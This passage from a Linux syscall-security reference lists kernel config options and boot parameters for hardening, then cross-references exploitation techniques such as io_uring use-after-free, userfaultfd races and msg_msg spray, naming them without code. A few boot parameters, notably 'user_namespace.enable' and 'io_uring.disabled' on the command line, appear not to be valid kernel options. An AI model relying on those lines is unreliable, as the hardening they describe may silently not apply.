
For custom-built kernels (embedded systems, security appliances, hardened VMs), disabling syscall subsystems at compile time eliminates entire attack surfaces:

```bash
# Disable io_uring entirely
CONFIG_IO_URING=n

# Disable userfaultfd
CONFIG_USERFAULTFD=n

# Disable user namespaces (prevents unprivileged namespace creation)
CONFIG_USER_NS=n
# Or allow but default-disable at boot: user_namespace.enable=0

# Restrict eBPF
CONFIG_BPF_UNPRIV_DEFAULT_OFF=y

# Disable kexec (prevents kernel replacement)
CONFIG_KEXEC=n
CONFIG_KEXEC_FILE=n

# Disable kernel module loading at runtime (requires all modules built-in)
CONFIG_MODULES=n
# Or allow but lock after boot via sysctl: kernel.modules_disabled=1

# Enable KASAN for development/testing (detects UAF, OOB at runtime)
CONFIG_KASAN=y
CONFIG_KASAN_GENERIC=y

# Enable seccomp
CONFIG_SECCOMP=y
CONFIG_SECCOMP_FILTER=y

# Enable Yama LSM
CONFIG_SECURITY_YAMA=y

# Harden usercopy (prevents kernel buffer overflows via copy_from/to_user)
CONFIG_HARDENED_USERCOPY=y

# Stack protector
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y

# Randomize kernel stack offset on syscall entry (Linux 5.13+)
CONFIG_RANDOMIZE_KSTACK_OFFSET=y
CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT=y
```

**`CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT`** (Linux 5.13+) deserves specific attention: on every syscall entry, the kernel adds a random offset to the stack pointer before dispatching the handler. This breaks exploit techniques that rely on predictable kernel stack layout (e.g., stack-spray techniques where the attacker controls data at known stack offsets via deeply nested syscall argument structures). The overhead is minimal (~1% on microbenchmarks).

**Boot parameters for runtime restriction:**

```bash
# Kernel command line additions for hardened boot
GRUB_CMDLINE_LINUX="... io_uring.disabled=2 user_namespace.enable=0 \
    module.sig_enforce=1 lockdown=confidentiality \
    randomize_kstack_offset=on init_on_alloc=1 init_on_free=1"
```

`lockdown=confidentiality` (Linux 5.4+) restricts access to kernel memory from user space: blocks `/dev/mem`, `/dev/kmem`, `/dev/port`, raw I/O port access, and custom ACPI tables. `init_on_alloc=1` and `init_on_free=1` zero-initialize heap allocations and freed memory, eliminating information leaks from uninitialized kernel memory.

---

## 13. Cross-references

**To Chapter 2A (process memory):** `userfaultfd` hooks into the page fault handler (Chapter 2A §9). `process_vm_readv`/`process_vm_writev` operate through the kernel's direct map (Chapter 2A §12). `mmap` flags and `mprotect` semantics are the building blocks for understanding what ptrace's `PTRACE_POKEDATA` can and cannot do (it can write to `VM_WRITE` regions but the kernel bypasses VMA permission checks by walking the page tables directly, which is why ptrace can write to technically-unwritable memory — it operates at the physical-page level, not the VMA level). The KPTI discussion in §1.8 connects to Chapter 2A's page table material.

**To Chapter 2C (capabilities, namespaces, LSMs):** `CAP_SYS_PTRACE` gates ptrace, `process_vm_readv`, and privileged `userfaultfd`. `CAP_SYS_ADMIN` gates `io_uring` in some configurations and `PTRACE_O_SUSPEND_SECCOMP`. Seccomp interacts with capabilities via `PR_SET_NO_NEW_PRIVS`. Namespaces affect ptrace access checks: user namespaces remap UIDs, and ptrace's UID comparison uses the caller's namespace view. LSMs (SELinux, AppArmor, Yama) add additional ptrace access controls. The cgroup `devices` controller can restrict device access that `io_uring` file operations might attempt. Seccomp policy management at the orchestration layer (Docker, Kubernetes) is covered in Chapter 2C.

**To Domain 1 (binary formats):** The `pt_regs` structure that ptrace reads is the same register frame the kernel populates during `execve` (Domain 1, Chapter 1A §5). The `syscall` instruction's clobbering of `RCX` and `R11` (§1.1) is why the ELF ABI uses `R10` for the fourth syscall argument rather than `RCX`.

**To Domain 5 (kernel exploitation):** The io_uring UAF exploitation pattern (§4.4–4.5) follows the general kernel heap exploitation methodology described in Domain 5 Chapter 5A. The userfaultfd TOCTOU technique (§5.3) is the standard primitive for winning kernel race conditions described in Domain 5 Chapter 5B. The `msg_msg` spray used for slab reclamation in io_uring exploits is detailed in Domain 5 Chapter 5A §3.

**To the attack taxonomy (Section 1):** Seccomp is the primary syscall-level sandbox for container runtimes (Docker, Kubernetes, gVisor), browser sandboxes (Chromium on Linux), and application sandboxes (Flatpak, Snap). `io_uring`'s seccomp bypass is a live concern in container security. `userfaultfd` is a kernel-exploit primitive. ptrace-based injection is a standard lateral-movement technique. The interplay of seccomp + Yama + user namespaces is what defines the practical sandbox boundary on Linux.
